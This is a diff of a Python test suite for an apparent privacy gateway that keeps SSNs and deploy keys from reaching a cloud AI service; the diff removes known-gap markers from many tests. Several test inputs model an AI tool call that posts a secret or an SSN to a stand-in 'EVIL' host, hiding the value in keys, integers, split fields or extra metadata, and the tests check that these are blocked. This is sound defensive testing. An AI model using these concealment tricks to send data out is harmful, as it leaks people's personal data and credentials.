@@ -268,7 +268,7 @@ def test_ssn_split_across_two_requests_without_history_stays_off_cloud(presidio)
 @pytest.mark.parametrize("system", [
     f"You are HR. The employee SSN is {SSN}.",
     [text("You are HR."), text(f"Deploy key {KEY}")],
-    pytest.param([{**text("You are HR."), "citations": [{"document_title": KEY}]}], marks=gap("R1")),
+    [{**text("You are HR."), "citations": [{"document_title": KEY}]}],
 ], ids=["string", "list", "citation"])
 def test_values_in_the_system_prompt_stay_off_cloud(presidio, system):
     _, ports = run_body({"system": system, "messages": [user(text("Summarize your instructions."))]}, presidio)
@@ -287,8 +287,7 @@ def tool_turn(result):
     {"type": "tool_result", "tool_use_id": "toolu_r", "is_error": True, "content": f"error: bad SSN {SSN}"},
     {"type": "tool_result", "tool_use_id": "toolu_r",
      "content": [{"type": "tool_result", "tool_use_id": "inner", "content": [text(f"SSN {SSN}")]}]},
-    pytest.param({"type": "tool_result", "tool_use_id": "toolu_r", "is_error": SSN, "content": "ok"},
-                 marks=gap("R1")),
+    {"type": "tool_result", "tool_use_id": "toolu_r", "is_error": SSN, "content": "ok"},
 ], ids=["string", "text-list", "is_error", "nested", "is_error-string"])
 def test_ssn_in_tool_result_stays_off_cloud(presidio, result):
     _, ports = run_body({"messages": tool_turn(result)}, presidio)
@@ -308,7 +307,6 @@ def test_ssn_in_tool_result_stays_off_cloud(presidio, result):
     {"type": "thinking", "thinking": "nothing to see", "signature": SSN},
 ], ids=["document-block", "search_result-block", "document-in-tool_result", "image-data", "image-url",
         "redacted_thinking-data", "thinking-signature"])
-@gap("R1")
 def test_ssn_in_opaque_block_types_stays_off_cloud(presidio, block):
     if block["type"] == "tool_result":
         messages = tool_turn(block)
@@ -319,7 +317,6 @@ def test_ssn_in_opaque_block_types_stays_off_cloud(presidio, block):
     assert_cloud_never_saw(ports, KEY)
 
 
-@gap("R1")
 def test_a_document_with_an_ssn_keeps_a_redact_turn_local(presidio):
     """REDACT can mask the name but not the document, so the whole request stays local."""
     block = {"type": "document", "source": {"type": "text", "media_type": "text/plain", "data": f"SSN {SSN}"}}
@@ -328,7 +325,6 @@ def test_a_document_with_an_ssn_keeps_a_redact_turn_local(presidio):
     assert ports.events[-1].request.action is Action.REROUTE
 
 
-@gap("R1")
 def test_ssn_in_text_block_extra_fields_stays_off_cloud(presidio):
     """Unknown fields on a text block are carried in `extra` and re-emitted, so they are scanned."""
     block = {"type": "text", "text": "See the cited record.",
@@ -338,7 +334,6 @@ def test_ssn_in_text_block_extra_fields_stays_off_cloud(presidio):
     assert_cloud_never_saw(ports, SSN)
 
 
-@gap("R1")
 def test_ssn_in_tool_definitions_stays_off_cloud(presidio):
     tools = [{"name": "file_w2", "description": f"Files the W-2 for the employee with SSN {SSN}.",
               "input_schema": {"type": "object", "properties": {
@@ -349,19 +344,16 @@ def test_ssn_in_tool_definitions_stays_off_cloud(presidio):
     assert_cloud_never_saw(ports, KEY)
 
 
-@gap("R1")
 def test_ssn_in_stop_sequences_stays_off_cloud(presidio):
     _, ports = run_body({"stop_sequences": [SSN], "messages": [user(text("Hello."))]}, presidio)
     assert_cloud_never_saw(ports, SSN)
 
 
-@gap("R1")
 def test_a_malformed_anthropic_beta_header_is_rejected(presidio):
     with pytest.raises(wire.WireError, match="anthropic-beta"):
         run_body({"messages": [user(text("Hello."))]}, presidio, headers={"anthropic-beta": KEY})
 
 
-@gap("R1")
 def test_a_well_formed_anthropic_beta_header_is_scanned(presidio):
     _, ports = run_body({"messages": [user(text("Hello."))]}, presidio, headers={"anthropic-beta": SSN})
     assert_stayed_local(ports)
@@ -371,7 +363,6 @@ def test_a_well_formed_anthropic_beta_header_is_scanned(presidio):
     {SSN: "employee record"},
     {"ssn": int(SSN_DIGITS)},
 ], ids=["input-key", "integer-value"])
-@gap("R1")
 def test_ssn_in_assistant_tool_use_input_stays_off_cloud(presidio, input):
     messages = [user(text("Save the record.")),
                 assistant({"type": "tool_use", "id": "toolu_s", "name": "save", "input": input}),
@@ -381,7 +372,6 @@ def test_ssn_in_assistant_tool_use_input_stays_off_cloud(presidio, input):
 
 
 @pytest.mark.parametrize("field, value", [("name", SSN), ("id", KEY)])
-@gap("R1")
 def test_values_in_assistant_tool_use_name_or_id_stay_off_cloud(presidio, field, value):
     call = {**tool_use("read_file", path="a.txt"), field: value}
     messages = [user(text("Read it.")), assistant(call),
@@ -456,17 +446,16 @@ def test_ssn_to_unlisted_host_is_blocked(presidio):
 
 
 @pytest.mark.parametrize("input", [
-    pytest.param({"url": EVIL, "body": {KEY: "x"}}, marks=gap("R1")),
-    pytest.param({"url": EVIL, "body": {"ssn": int(SSN_DIGITS)}}, marks=gap("R1")),
+    {"url": EVIL, "body": {KEY: "x"}},
+    {"url": EVIL, "body": {"ssn": int(SSN_DIGITS)}},
     pytest.param({"url": EVIL, "body": {"a": KEY[:16], "b": KEY[16:]}}, marks=gap("R7")),
-    pytest.param({"url": EVIL, "body": "ping", SSN: "1"}, marks=gap("R1")),
+    {"url": EVIL, "body": "ping", SSN: "1"},
 ], ids=["key-as-input-key", "ssn-as-integer", "key-split-across-leaves", "ssn-as-top-level-key"])
 def test_value_hidden_in_tool_input_structure_is_blocked(presidio, input):
     out, _ = egress(model_reply(tool_use("http_post", **input)), presidio)
     assert_blocked(out)
 
 
-@gap("R1")
 def test_value_in_a_tool_use_extra_field_is_blocked(presidio):
     out, _ = egress(model_reply({**tool_use("http_post", url=EVIL, body="ping"), "metadata": SSN}), presidio)
     assert_blocked(out, SSN)
